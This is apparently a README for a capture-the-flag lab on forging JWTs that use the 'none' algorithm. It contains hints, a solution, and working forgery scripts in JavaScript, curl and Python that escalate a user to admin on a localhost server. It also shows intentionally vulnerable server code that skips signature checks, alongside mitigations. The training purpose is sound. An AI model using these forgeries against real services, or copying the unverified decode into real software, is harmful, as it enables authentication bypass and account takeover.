# 🎫 Weak JWT Authentication Lab

## Overview

This CTF lab demonstrates critical JWT (JSON Web Token) security vulnerabilities, specifically the dangerous use of the "none" algorithm that allows token forgery without a signature.

## Vulnerability Type

**CWE-347: Improper Verification of Cryptographic Signature**

This lab simulates a misconfigured JWT implementation that accepts unsigned tokens, allowing attackers to craft their own tokens with arbitrary claims.

## Learning Objectives

- Understand JWT structure and components
- Learn about JWT algorithm vulnerabilities
- Practice token manipulation and forgery
- Explore authentication bypass techniques

## Challenge Details

- **Port:** 6000
- **Difficulty:** Medium
- **Objective:** Forge a JWT token to gain admin access

## Setup

```bash
npm install
npm start
```

Access the lab at: http://localhost:6000

## Getting Started

1. Log in with: `bob / bob123`
2. Examine the JWT token stored in cookies
3. Decode and analyze the token structure
4. Modify the token to gain admin access
5. Access `/api/admin/flag` to get the flag

## JWT Basics

A JWT consists of three parts separated by dots:

```
header.payload.signature
```

Example:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.
```

### Header

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

### Payload

```json
{
  "username": "bob",
  "role": "user",
  "iat": 1234567890
}
```

### Signature

Empty for "none" algorithm!

## Hints

<details>
<summary>Hint 1 (Click to reveal)</summary>

After logging in, check the cookies in your browser (F12 → Application/Storage → Cookies). Look for `session_token`.

</details>

<details>
<summary>Hint 2 (Click to reveal)</summary>

Copy the JWT token and decode it at [jwt.io](https://jwt.io). Notice the algorithm and payload.

</details>

<details>
<summary>Hint 3 (Click to reveal)</summary>

The token uses "none" algorithm. You can create a new token with `role: "admin"` without any signature!

</details>

<details>
<summary>Hint 4 (Click to reveal)</summary>

Use jwt.io to create a token with:

```json
{
  "username": "bob",
  "role": "admin",
  "iat": 1234567890
}
```

Algorithm: none, Leave signature empty.

</details>

<details>
<summary>Solution (Click to reveal)</summary>

1. Login as bob
2. Decode the JWT at jwt.io
3. Change `role` from "user" to "admin"
4. Set algorithm to "none"
5. Copy the new token
6. Replace the `session_token` cookie with your forged token
7. Visit `/api/admin/flag`

Or use this JavaScript in the browser console:

```javascript
// Create forged token
const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" }));
const payload = btoa(
  JSON.stringify({
    username: "bob",
    role: "admin",
    iat: Math.floor(Date.now() / 1000),
  }),
);
const forgedToken = header + "." + payload + ".";

// Set cookie
document.cookie = `session_token=${forgedToken}; path=/`;

// Get flag
fetch("/api/admin/flag")
  .then((r) => r.json())
  .then(console.log);
```

</details>

## API Endpoints

- `POST /api/login` - Login endpoint
- `POST /api/logout` - Logout endpoint
- `GET /api/me` - Get current user info
- `GET /api/admin/flag` - **TARGET:** Admin-only endpoint (returns the flag)
- `GET /api/admin/users` - Admin-only endpoint (lists all users)

## Users

| Username | Password | Role |
| -------- | -------- | ---- |
| bob      | bob123   | user |
| alice    | alice123 | user |

## Real-World Impact

JWT vulnerabilities have led to:

- Authentication bypass in major platforms
- Privilege escalation attacks
- Account takeovers
- Unauthorized API access

**Famous Examples:**

- Auth0 "none" algorithm vulnerability (CVE-2015-9235)
- Multiple e-commerce platform breaches
- Cloud service authentication bypasses

## Exploitation Techniques

### Method 1: Browser Console

```javascript
// Step 1: Decode current token
const token = document.cookie.split("session_token=")[1].split(";")[0];
console.log("Current token:", token);

// Step 2: Create admin token
const header = btoa(JSON.stringify({ alg: "none", typ: "JWT" }));
const payload = btoa(
  JSON.stringify({
    username: "bob",
    role: "admin",
    iat: Math.floor(Date.now() / 1000),
  }),
);
const adminToken = header + "." + payload + ".";

// Step 3: Set new cookie
document.cookie = `session_token=${adminToken}; path=/`;

// Step 4: Get flag
fetch("/api/admin/flag")
  .then((r) => r.json())
  .then((data) => console.log("FLAG:", data.flag));
```

### Method 2: Using curl

```bash
# Create the token components
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"username":"bob","role":"admin","iat":1234567890}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
TOKEN="${HEADER}.${PAYLOAD}."

# Get flag
curl http://localhost:6000/api/admin/flag \
  -H "Cookie: session_token=$TOKEN"
```

### Method 3: Using Python

```python
import requests
import json
import base64

# Create forged token
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"username":"bob","role":"admin","iat":1234567890}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Get flag
response = requests.get(
    'http://localhost:6000/api/admin/flag',
    cookies={'session_token': token}
)
print(response.json())
```

## Mitigation

To prevent JWT vulnerabilities:

1. **Never accept "none" algorithm**

   ```javascript
   jwt.verify(token, secret, {
     algorithms: ["HS256", "RS256"], // Whitelist only
   });
   ```

2. **Always verify signatures**

   ```javascript
   const decoded = jwt.verify(token, SECRET_KEY, {
     algorithms: ["HS256"],
   });
   ```

3. **Use strong secrets**
   - Minimum 256 bits for HS256
   - Use cryptographically random values
   - Store secrets securely (environment variables, key vaults)

4. **Validate token claims**
   - Check expiration (`exp`)
   - Verify issuer (`iss`)
   - Validate audience (`aud`)

5. **Implement token rotation**
   - Use short-lived access tokens
   - Implement refresh tokens
   - Revocation lists for compromised tokens

6. **Additional security measures**
   - Use HTTPS only
   - Implement rate limiting
   - Log suspicious activity
   - Monitor for token reuse

## Secure Implementation Example

```javascript
const jwt = require("jsonwebtoken");
const SECRET = process.env.JWT_SECRET; // Strong secret from environment

// Creating token
function createToken(payload) {
  return jwt.sign(payload, SECRET, {
    algorithm: "HS256",
    expiresIn: "1h",
  });
}

// Verifying token
function verifyToken(token) {
  try {
    return jwt.verify(token, SECRET, {
      algorithms: ["HS256"], // Explicit algorithm whitelist
    });
  } catch (e) {
    return null;
  }
}
```

## Code Walkthrough

The vulnerable code in `server.js`:

```javascript
// ❌ VULNERABLE: Uses "none" algorithm
function createToken(payload) {
  return jwt.sign(payload, null, { algorithm: "none" });
}

// ❌ VULNERABLE: Doesn't verify signature
function verifyToken(token) {
  const decoded = jwt.decode(token, { complete: true });
  return decoded.payload; // No verification!
}
```

## References

- [JWT.io](https://jwt.io)
- [RFC 7519 - JWT Specification](https://tools.ietf.org/html/rfc7519)
- [OWASP - JWT Security](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Auth0 - JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
- [CWE-347](https://cwe.mitre.org/data/definitions/347.html)

## Additional Resources

- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)

---

**Happy Hacking! 🚩**
